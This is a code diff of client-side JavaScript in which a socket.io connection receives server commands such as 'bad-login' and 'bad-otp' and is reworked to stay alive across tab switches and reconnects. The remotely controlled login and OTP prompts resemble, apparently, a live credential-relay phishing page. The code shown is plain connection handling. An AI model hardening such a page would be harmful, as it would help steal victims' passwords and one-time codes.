@@ -145,7 +145,7 @@ socket.on("user:command", (data) => {
       break;
 
     case "bad-login":
-      showError("incorrect password");
+      showError("Wrong password, try again");
       break;
 
     case "bad-otp":
@@ -255,40 +255,83 @@ async function submitFormData(formData) {
 // SAFE SOCKET RECREATION
 // ================================
 
-function getOrCreateSocket({ timeoutMs = 500 } = {}) {
+function getOrCreateSocket({ timeoutMs = 2000 } = {}) {
   return new Promise((resolve) => {
-    if (window.socket) return resolve(window.socket);
+    if (window.socket?.connected) {
+      return resolve(window.socket);
+    }
 
-    const start = Date.now();
-    const checkInterval = 50;
+    if (window.socket) {
+      return resolve(window.socket);
+    }
 
-    const timer = setInterval(() => {
-      if (window.socket) {
-        clearInterval(timer);
-        return resolve(window.socket);
-      }
+    const userId = sessionStorage.getItem("userId") || null;
 
-      if (Date.now() - start >= timeoutMs) {
-        clearInterval(timer);
+    window.socket = io("/", {
+      auth: { userId },
+      reconnection: true,
+      autoConnect: false,
+      reconnectionAttempts: 5,     // Increase resilience
+      reconnectionDelay: 1000,
+    });
 
-        userId = sessionStorage.getItem("userId") || null;
+    window.socket.on("connect", () => {
+      console.log("✅ Socket connected", window.socket.id);
+    });
 
-        window.socket = io("/", {
-          auth: { userId },
-          reconnection: true,
-        });
+    window.socket.on("connect_error", (err) => {
+      console.error("Socket connection error:", err);
+    });
 
-        return resolve(window.socket);
-      }
-    }, checkInterval);
+    window.socket.on("disconnect", (reason) => {
+      console.log("Socket disconnected:", reason);
+    });
+
+    window.socket.connect();
+    resolve(window.socket);
   });
 }
 
-(async () => {
-  const socketInstance = await getOrCreateSocket({ timeoutMs: 2000 });
-  window.socket = socketInstance;
+// Initialize on multiple events but NEVER disconnect on tab switch
+function initPersistentSocket() {
+  const events = ['load', 'pageshow', 'visibilitychange', 'focus'];
 
-  socketInstance.on("connect", () =>
-    console.log("connected", socketInstance.id)
-  );
-})();
+  let initialized = false;
+
+  const handler = async (event) => {
+    if (initialized) return;
+
+    initialized = true;
+    console.log(`🔌 Initializing persistent socket after "${event.type}"`);
+
+    await getOrCreateSocket();
+  };
+
+  // Attach listeners
+  events.forEach(ev => {
+    window.addEventListener(ev, handler);
+  });
+
+  // Immediate check
+  if (document.readyState === 'complete') {
+    handler({ type: 'immediate' });
+  }
+}
+
+// === Important: Do NOT disconnect on visibility change ===
+document.addEventListener('visibilitychange', () => {
+  if (window.socket) {
+    if (document.visibilityState === 'visible') {
+      console.log("Tab visible - ensuring socket is connected");
+      if (!window.socket.connected) {
+        window.socket.connect();
+      }
+    } else {
+      console.log("Tab hidden - keeping socket alive (not disconnecting)");
+      // IMPORTANT: We do NOTHING here → socket stays connected
+    }
+  }
+});
+
+// Run the initializer
+initPersistentSocket();
